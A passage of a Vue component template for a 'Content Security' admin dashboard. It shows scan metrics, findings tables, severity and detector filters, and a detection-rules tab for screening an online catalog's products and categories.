    case 'MEDIUM': return 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30';
    case 'LOW': return 'bg-slate-500/10 text-slate-600 dark:text-slate-400 border-slate-500/30';
    case 'INFO': return 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30';
    default: return 'bg-slate-500/10 text-slate-600 border-slate-500/30';
  }
};
</script>

<template>
  <div class="space-y-6 animate-in fade-in duration-500 pb-12">
    <!-- Header Row -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-5">
      <div class="space-y-1">
        <div class="flex items-center gap-2">
          <div class="w-8 h-8 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center text-primary shadow-xs">
            <Shield class="w-4 h-4" />
          </div>
          <h1 class="text-2xl sm:text-3xl font-display font-extrabold tracking-tight text-foreground">
            Content Security
          </h1>
          <span class="ml-2 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-primary/10 text-primary border border-primary/20">
            Active Guard
          </span>
        </div>
        <p class="text-xs sm:text-sm text-muted-foreground">
          Automated threat detection, payload inspection, and content integrity enforcement across products and categories.
        </p>
      </div>

      <!-- Header Actions -->
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-right hidden md:block">
          <p class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Last Scanned</p>
          <p class="text-xs font-semibold text-foreground flex items-center gap-1">
            <Clock class="w-3 h-3 text-muted-foreground" />
            {{ lastScanTimestamp }}
          </p>
        </div>

        <UiButton 
          v-if="canRunContentScan"
          @click="runFullScan" 
          :disabled="isScanning"
          class="h-10 px-5 gap-2 font-bold text-xs shadow-md shadow-primary/20 whitespace-nowrap"
        >
          <Play v-if="!isScanning" class="w-3.5 h-3.5 fill-current" />
          <RefreshCw v-else class="w-3.5 h-3.5 animate-spin" />
          <span>{{ isScanning ? 'Scanning Catalog...' : 'Run Scan' }}</span>
        </UiButton>
      </div>
    </div>

    <!-- Active Scan Banner (Shows when scan is running) -->
    <div 
      v-if="isScanning" 
      class="bg-card border border-primary/30 rounded-2xl p-4 sm:p-5 shadow-lg relative overflow-hidden animate-in fade-in duration-300"
    >
      <div class="absolute -right-12 -top-12 w-40 h-40 bg-primary/10 rounded-full blur-2xl"></div>
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3 relative z-10">
        <div class="flex items-center gap-3">
          <div class="w-9 h-9 rounded-xl bg-primary text-primary-foreground flex items-center justify-center shrink-0 shadow-sm animate-pulse">
            <ShieldCheck class="w-5 h-5" />
          </div>
          <div>
            <h3 class="text-sm font-bold text-foreground">Executing Full Security Inspection</h3>
            <p class="text-xs text-muted-foreground font-mono">{{ scanStepText }}</p>
          </div>
        </div>
        <div class="text-right font-mono font-bold text-sm text-primary shrink-0">
          {{ scanProgress }}%
        </div>
      </div>
      <!-- Progress Bar -->
      <div class="w-full h-2 bg-muted rounded-full overflow-hidden relative z-10">
        <div 
          class="h-full bg-primary transition-all duration-500 rounded-full"
          :style="{ width: `${scanProgress}%` }"
        ></div>
      </div>
    </div>

    <!-- Primary Section Navigation Tabs -->
    <div class="flex items-center gap-2 border-b border-border">
      <button
        @click="mainTab = 'overview'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'overview'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <SlidersHorizontal class="w-4 h-4" />
        <span>Overview</span>
      </button>

      <button
        @click="mainTab = 'results'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'results'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertTriangle class="w-4 h-4" />
        <span>Scan Results</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ summaryMetrics.critical + summaryMetrics.high + summaryMetrics.needsReview }}
        </span>
      </button>

      <button
        v-if="canViewFindings"
        @click="mainTab = 'findings'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'findings'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertCircle class="w-4 h-4" />
        <span>Findings</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ findingsCount }}
        </span>
      </button>

      <button
        @click="mainTab = 'rules'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'rules'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <Code2 class="w-4 h-4" />
        <span>Detection Rules</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-muted text-muted-foreground border border-border ml-1">
          {{ detectionRulesSummary.total }}
        </span>
      </button>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 1: OVERVIEW TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'overview'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Summary Metrics Cards -->
      <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 sm:gap-4">
        <!-- Total Scanned -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-muted-foreground mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest">Total Scanned</span>
            <Layers class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-foreground">
              {{ summaryMetrics.total.toLocaleString() }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              4,120 Products, 186 Categories
            </p>
          </div>
        </div>

        <!-- Clean Rate -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-emerald-600 dark:text-emerald-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Clean</span>
            <CheckCircle2 class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-emerald-600 dark:text-emerald-400">
              {{ summaryMetrics.clean.toLocaleString() }}
            </p>
            <p class="text-[11px] text-emerald-600/90 dark:text-emerald-400/90 mt-1 font-semibold">
              {{ summaryMetrics.cleanPercent }}% Compliant
            </p>
          </div>
        </div>

        <!-- Needs Review -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-amber-600 dark:text-amber-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Needs Review</span>
            <Info class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-amber-600 dark:text-amber-400">
              {{ summaryMetrics.needsReview }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Pending manual inspection
            </p>
          </div>
        </div>

        <!-- High Risk -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-orange-600 dark:text-orange-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">High Risk</span>
            <AlertTriangle class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-orange-600 dark:text-orange-400">
              {{ summaryMetrics.high }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Dangerous links & attributes
            </p>
          </div>
        </div>

        <!-- Critical -->
        <div class="bg-card border border-rose-500/20 bg-rose-500/5 rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between col-span-2 sm:col-span-1">
          <div class="flex items-center justify-between text-rose-600 dark:text-rose-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-rose-600 dark:text-rose-400">Critical</span>
            <AlertOctagon class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-rose-600 dark:text-rose-400">
              {{ summaryMetrics.critical }}
            </p>
            <p class="text-[11px] text-rose-600/90 dark:text-rose-400/90 mt-1 font-semibold">
              Immediate action required
            </p>
          </div>
        </div>
      </div>

      <!-- Middle Grid: Detection Breakdown & Scanner Status -->
      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <!-- Detection Method Breakdown -->
        <div class="lg:col-span-4 bg-card border border-border rounded-2xl p-5 shadow-xs flex flex-col justify-between space-y-4">
          <div>
            <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
              <ShieldAlert class="w-4 h-4 text-primary" />
              Threats by Detector Type
            </h3>
            <p class="text-xs text-muted-foreground mt-0.5">Distribution of flagged payloads across rules</p>
          </div>

          <div class="space-y-3">
            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Blacklisted Domains</span>
                <span class="text-muted-foreground">3 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-rose-500 rounded-full" style="width: 40%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Dangerous HTML Tags (script/iframe)</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-orange-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Event Handlers & JS Attributes</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-amber-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Spam & Phishing Keywords</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-blue-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>
          </div>

          <div class="pt-3 border-t border-border flex items-center justify-between">
            <span class="text-xs text-muted-foreground font-medium">Active Rule Sets</span>
            <button 
              @click="mainTab = 'rules'" 
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              Configure Rules <ArrowRight class="w-3 h-3" />
            </button>
          </div>
        </div>

        <!-- Recent Findings Compact Section -->
        <div class="lg:col-span-8 bg-card border border-border rounded-2xl p-5 shadow-xs space-y-4">
          <div class="flex items-center justify-between">
            <div>
              <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
                <AlertTriangle class="w-4 h-4 text-amber-500" />
                Recent Flagged Findings
              </h3>
              <p class="text-xs text-muted-foreground mt-0.5">Latest high-priority security exceptions</p>
            </div>
            <button 
              @click="mainTab = 'results'"
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              View All ({{ contentScansCount }}) <ArrowRight class="w-3 h-3" />
            </button>
          </div>

          <!-- Compact List of Findings -->
          <div class="divide-y divide-border border border-border rounded-xl overflow-hidden">
            <div 
              v-for="item in recentFindings" 
              :key="item.id"
              @click="openFindingDetail(item)"
              class="p-3.5 hover:bg-muted/30 transition-colors flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer group"
            >
              <div class="flex items-start gap-3 min-w-0">
                <div 
                  :class="cn(
                    'w-8 h-8 rounded-lg flex items-center justify-center shrink-0 mt-0.5',
                    item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600' :
                    item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600' :
                    item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600' : 'bg-emerald-500/10 text-emerald-600'
                  )"
                >
                  <component :is="getStatusBadge(item.status).icon" class="w-4 h-4" />
                </div>
                <div class="min-w-0 space-y-0.5">
                  <div class="flex items-center gap-2 flex-wrap">
                    <span class="text-xs font-bold text-foreground group-hover:text-primary transition-colors truncate max-w-[280px] sm:max-w-[340px]">
                      {{ item.contentName }}
                    </span>
                    <span class="text-[10px] font-mono text-muted-foreground bg-muted px-1.5 py-0.5 rounded">
                      {{ item.field }}
                    </span>
                  </div>
                  <p class="text-xs text-muted-foreground line-clamp-1">
                    {{ item.description }}
                  </p>
                </div>
              </div>

              <div class="flex items-center justify-between sm:justify-end gap-3 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50">
                <div class="text-right">
                  <span 
                    :class="cn(
                      'px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                      item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/20' :
                      item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/20' :
                      item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/20' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/20'
                    )"
                  >
                    {{ item.status }}
                  </span>
                  <p class="text-[10px] text-muted-foreground mt-0.5">{{ item.scannedAt }}</p>
                </div>
                <button 
                  class="p-1.5 rounded-lg text-muted-foreground group-hover:text-primary hover:bg-muted transition-colors"
                  title="View finding details"
                >
                  <ChevronRight class="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 2: SCAN RESULTS TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'results'" class="space-y-4 animate-in fade-in duration-300">
      <!-- Search & Filters Toolbar -->
      <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Search Box -->
          <div class="relative flex-1">
            <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <input 
              v-model="searchQuery"
              type="text" 
              placeholder="Search content name, ID, or field name..." 
              class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            />
            <button 
              v-if="searchQuery" 
              @click="searchQuery = ''"
              class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              <X class="w-3.5 h-3.5" />
            </button>
          </div>

          <!-- Filter Dropdowns Row -->
          <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
            <!-- Content Type -->
            <select 
              v-model="filterContentType"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Types</option>
              <option value="Product">Products</option>
              <option value="Category">Categories</option>
            </select>

            <!-- Status Filter -->
            <select 
              v-model="filterStatus"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Statuses</option>
              <option value="Critical">Critical</option>
              <option value="High Risk">High Risk</option>
              <option value="Needs Review">Needs Review</option>
              <option value="Clean">Clean</option>
              <option value="Resolved">Resolved</option>
            </select>

            <!-- Page Size Selector -->
            <div class="flex items-center gap-1.5 border-l border-border pl-2 shrink-0">
              <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
              <select 
                v-model="itemsPerPage"
                class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option :value="5">5 / page</option>
                <option :value="10">10 / page</option>
                <option :value="25">25 / page</option>
                <option :value="50">50 / page</option>
              </select>
            </div>

            <!-- Reset Button -->
            <button 
              v-if="searchQuery || filterContentType !== 'all' || filterStatus !== 'all'"
              @click="resetFilters"
              class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
              title="Reset all filters"
            >
              Reset
            </button>
          </div>
        </div>
      </div>

      <!-- Main Scan Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <UiTable 
          :columns="scanResultColumns" 
          :data="contentScansData"
          empty-text="No content scans found"
          empty-description="No items match your active filters or search criteria."
          :loading="isContentScansLoading"
        >
          <!-- Status Cell -->
          <template #cell-status="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' :
                item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 dark:text-orange-400 border-orange-500/30' :
                item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' :
                item.status === 'Clean' ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' :
                'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30'
              )"
            >
              {{ item.status }}
            </span>
          </template>

          <!-- Risk Score Cell -->
          <template #cell-risk_score="{ item }">
            <div class="flex items-center gap-2">
              <div class="w-12 h-2 bg-muted rounded-full overflow-hidden">
                <div 
                  :class="cn(
                    'h-full rounded-full',
                    item.risk_score >= 80 ? 'bg-rose-500' :
                    item.risk_score >= 50 ? 'bg-amber-500' : 'bg-emerald-500'
                  )"
                  :style="{ width: `${item.risk_score}%` }"
                ></div>
              </div>
              <span class="text-xs font-mono font-bold text-foreground">
                {{ item.risk_score }}
              </span>
            </div>
          </template>

          <!-- Scanned At Cell -->
          <template #cell-scanned_at="{ item }">
            <span class="text-xs text-muted-foreground font-mono">
              {{ new Date(item.scanned_at).toLocaleString() }}
            </span>
          </template>

          <!-- Actions Cell -->
          <template #cell-actions="{ item }">
            <div class="flex items-center justify-end gap-1.5">
              <button 
                @click.stop="openScanDetail(item)"
                class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                title="View scan details"
                aria-label="View scan details"
              >
                <Eye class="w-4 h-4" />
              </button>
            </div>
          </template>
        </UiTable>

        <!-- Pagination Controls -->
        <div class="px-4 py-3 border-t border-border bg-muted/20 flex items-center justify-between">
          <UiPagination 
            :current-page="currentPage"
            :total-pages="contentScansPages"
            :total-count="contentScansCount"
            :items-per-page="itemsPerPage"
            item-label="scans"
            @update:current-page="currentPage = $event"
          />
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION: FINDINGS TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'findings'" class="space-y-4 animate-in fade-in duration-300">
      <!-- Search & Filters Toolbar -->
      <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Search Box -->
          <div class="relative flex-1">
            <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <input 
              v-model="findingSearchQuery"
              type="text" 
              placeholder="Search field, detector, message, matched value, or ID..." 
              class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            />
            <button 
              v-if="findingSearchQuery" 
              @click="findingSearchQuery = ''"
              class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              <X class="w-3.5 h-3.5" />
            </button>
          </div>

          <!-- Filter Dropdowns Row -->
          <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
            <!-- Content Type -->
            <select 
              v-model="findingContentType"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Types</option>
              <option value="Product">Products</option>
              <option value="Category">Categories</option>
            </select>

            <!-- Severity Filter -->
            <select 
              v-model="findingSeverity"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Severities</option>
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>

            <!-- Detector Filter -->
            <select 
              v-model="findingDetector"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Detectors</option>
              <option value="KEYWORD">Keyword</option>
              <option value="DOMAIN">Domain</option>
              <option value="HTML_TAG">HTML Tag</option>
              <option value="HTML_ATTRIBUTE">HTML Attribute</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>

            <!-- Review Status Filter -->
            <select 
              v-model="findingReviewStatus"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Statuses</option>
              <option value="PENDING">Needs Review</option>
              <option value="APPROVED">Confirmed Risk</option>
              <option value="RESOLVED">Resolved</option>
              <option value="FALSE_POSITIVE">Safe / Whitelisted</option>
            </select>

            <!-- Page Size Selector -->
            <div class="flex items-center gap-1.5 border-l border-border pl-2 shrink-0">
              <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
              <select 
                v-model="findingPageSize"
                class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option :value="5">5 / page</option>
                <option :value="10">10 / page</option>
                <option :value="25">25 / page</option>
                <option :value="50">50 / page</option>
              </select>
            </div>

            <!-- Reset Button -->
            <button 
              v-if="findingSearchQuery || findingContentType !== 'all' || findingSeverity !== 'all' || findingDetector !== 'all' || findingCategory !== 'all' || findingReviewStatus !== 'all'"
              @click="resetFindingFilters"
              class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
              title="Reset all filters"
            >
              Reset
            </button>
          </div>
        </div>
      </div>

      <!-- Findings Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <UiTable 
          :columns="findingColumns" 
          :data="findingsData"
          empty-text="No findings detected"
          empty-description="No security findings match your active filters or search criteria."
          :loading="isFindingsLoading"
        >
          <!-- Severity Cell -->
          <template #cell-severity="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                getSeverityBadge(item.severity)
              )"
            >
              {{ item.severity }}
            </span>
          </template>

          <!-- Review Status Cell -->
          <template #cell-review_status="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                getFindingReviewStatusBadge(item.review_status).class
              )"
            >
              {{ getFindingReviewStatusBadge(item.review_status).label }}
            </span>
          </template>

          <!-- Matched Value Cell -->
          <template #cell-matched_value="{ item }">
            <span 
              class="font-mono text-xs text-foreground bg-muted/60 px-1.5 py-0.5 rounded max-w-[180px] truncate block"
              :title="item.matched_value"
            >
              {{ item.matched_value || '—' }}
            </span>
          </template>

          <!-- Message Cell -->
          <template #cell-message="{ item }">
            <span 
              class="text-xs text-muted-foreground max-w-[220px] truncate block"
              :title="item.message"
            >
              {{ item.message || '—' }}
            </span>
          </template>

          <!-- Created At Cell -->
          <template #cell-created_at="{ item }">
            <span class="text-xs text-muted-foreground font-mono">
              {{ formatDate(item.created_at) }}
            </span>
          </template>

          <!-- Actions Cell -->
          <template #cell-actions="{ item }">
            <div class="flex items-center justify-end gap-1.5">
              <button 
                @click.stop="openFindingDetail(item as any)"
                class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                title="View finding details"
                aria-label="View finding details"
              >
                <Eye class="w-4 h-4" />
              </button>
              <button 
                v-if="canReviewFinding"
                @click.stop="openFindingReview(item as any)"
                class="p-1.5 rounded-lg text-muted-foreground hover:text-primary hover:bg-primary/10 transition-colors cursor-pointer"
                title="Review finding"
                aria-label="Review finding"
              >
                <ShieldCheck class="w-4 h-4" />
              </button>
              <button 
                v-if="canResolveFinding"
                @click.stop="openFindingResolve(item as any)"
                class="p-1.5 rounded-lg text-muted-foreground hover:text-emerald-600 hover:bg-emerald-500/10 transition-colors cursor-pointer"
                title="Resolve finding"
                aria-label="Resolve finding"
              >
                <CheckCircle class="w-4 h-4" />
              </button>
            </div>
          </template>
        </UiTable>

        <!-- Pagination Controls -->
        <div class="px-4 py-3 border-t border-border bg-muted/20 flex items-center justify-between">
          <UiPagination 
            :current-page="findingPage"
            :total-pages="findingsPages"
            :total-count="findingsCount"
            :items-per-page="findingPageSize"
            item-label="findings"
            @update:current-page="findingPage = $event"
          />
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 3: DETECTION RULES TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'rules'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Sub-Tabs for Detection Rules -->
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-3">
        <div class="flex items-center gap-2 overflow-x-auto custom-scrollbar pb-1 sm:pb-0">
          <button 
            v-for="sub in visibleSubTabs"
            :key="sub.id"
            @click="rulesSubTab = sub.id as any"
            :class="cn(
              'px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5',
              rulesSubTab === sub.id 
                ? 'bg-primary text-primary-foreground shadow-sm' 
                : 'text-muted-foreground hover:text-foreground hover:bg-muted'
            )"
          >
            <span>{{ sub.label }}</span>
            <span 
              :class="cn(
                'px-1.5 py-0.2 rounded-full text-[10px] font-bold',
                rulesSubTab === sub.id ? 'bg-primary-foreground/20 text-primary-foreground' : 'bg-muted text-muted-foreground'
              )"
            >
              {{ sub.count }}
            </span>
          </button>
        </div>

        <UiButton 
          v-if="(rulesSubTab === 'keywords' && canAddKeywordRule) || (rulesSubTab === 'domains' && canAddDomainRule) || (rulesSubTab === 'hidden_content' && canAddHiddenContentRule) || (rulesSubTab === 'obfuscation' && canAddObfuscationRule) || (rulesSubTab === 'redirects' && canAddRedirectRule) || (rulesSubTab === 'attributes' && canAddHtmlAttributeRule) || (rulesSubTab === 'html' && canAddHtmlTagRule)"
          @click="openAddRuleModal(
            rulesSubTab === 'keywords' ? 'keyword' :
            rulesSubTab === 'domains' ? 'domain' :
            rulesSubTab === 'hidden_content' ? 'hidden_content' :
            rulesSubTab === 'obfuscation' ? 'obfuscation' :
            rulesSubTab === 'html' ? 'html' :
            rulesSubTab === 'attributes' ? 'attribute' : 'redirect'
          )"
          size="sm"
          class="h-9 px-4 gap-1.5 font-bold text-xs shrink-0"
        >
          <Plus class="w-3.5 h-3.5" />
          <span>Add {{ 
            rulesSubTab === 'keywords' ? 'Keyword' :
            rulesSubTab === 'domains' ? 'Domain' :
            rulesSubTab === 'hidden_content' ? 'Hidden Content Rule' :
            rulesSubTab === 'obfuscation' ? 'Obfuscation Rule' :
            rulesSubTab === 'html' ? 'HTML Tag' :
            rulesSubTab === 'attributes' ? 'Attribute' : 'Redirect Rule'
          }}</span>
        </UiButton>
      </div>

      <!-- Keywords Subtab Specific Filters & Table -->
      <div v-if="rulesSubTab === 'keywords'" class="space-y-4">
        <!-- Keyword Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="keywordSearchQuery"
                type="text" 
                placeholder="Search keywords..." 
                class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
              />
              <button 
                v-if="keywordSearchQuery" 
                @click="keywordSearchQuery = ''"
                class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filters Dropdowns Row -->
            <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="keywordCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

